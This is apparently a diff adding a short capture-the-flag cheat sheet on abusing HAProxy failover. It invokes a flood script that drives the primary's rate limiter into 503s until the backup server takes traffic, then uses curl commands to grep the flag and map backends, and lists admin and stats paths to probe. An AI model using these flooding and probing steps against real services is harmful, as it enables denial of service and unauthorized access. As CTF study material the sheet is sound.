@@ -1,0 +1,28 @@
+# Load Balancer / Failover Abuse Payloads
+
+## Health-Check Failover (HAProxy `backup` server)
+# The backup only receives traffic when all non-backup servers are DOWN.
+# Make the active backend fail health checks (return non-2xx):
+#  - app rate limiter returns 503 when flooded -> health check fails -> failover
+python3 scripts/failover_flood.py http://host/ 40 15
+# After failover, single requests hit the backup (may serve the flag):
+curl -s http://host/ | grep picoCTF
+
+## Backend Mapping (which server is answering?)
+for i in $(seq 1 20); do curl -s http://host/ | grep -oE '<p>[^<]*</p>'; done
+
+## Stats / Admin Paths Worth Probing
+/stats
+/status
+/health
+/healthz
+/haproxy
+/haproxy?stats
+/admin
+
+## HAProxy Config Directives That Reveal the Failover Logic
+server primary 10.x.x.x:5000 check
+server backup  10.x.x.x:5001 backup check   # backup: only used when others are DOWN
+option httpchk                              # active HTTP health check
+fall 3                                      # mark DOWN after 3 failed checks
+inter 2s                                    # health check interval
